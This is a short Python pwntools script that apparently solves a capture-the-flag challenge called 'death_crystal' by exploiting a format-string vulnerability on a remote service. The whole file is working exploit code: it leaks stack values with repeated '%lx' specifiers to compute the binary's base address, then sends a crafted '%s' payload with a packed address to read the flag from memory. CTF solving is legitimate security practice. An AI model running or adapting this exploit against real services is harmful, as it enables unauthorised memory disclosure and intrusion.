#!/usr/bin/env python
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft

context.terminal = ['alacritty', '-e', 'sh', '-c']

c = remote('60.250.197.227', 10004)
#c = process('./death_crystal-patch')
e = ELF('./death_crystal-patch')


#init
context.os='linux'
context.arch='amd64'
#context.log_level ='debug'
#gdb.attach(c)

# 00100b20 41 57           PUSH       R15
ans = b'%lx' * 12
c.sendline(ans)
c.recvuntil('Foresee:\n', drop=True)
text_addr = int(c.recvline()[-15:], 16) - 0x0100b20
print(hex(text_addr))
flag_addr = 0x0302060 + text_addr

print(hex(flag_addr))

# make address
stack_dump = b'%lx' * (5 + 4) + b'%s'
ans = stack_dump.ljust(8 * (4), b'x') + p64(flag_addr)
c.sendline(ans)

c.interactive()
c.close()
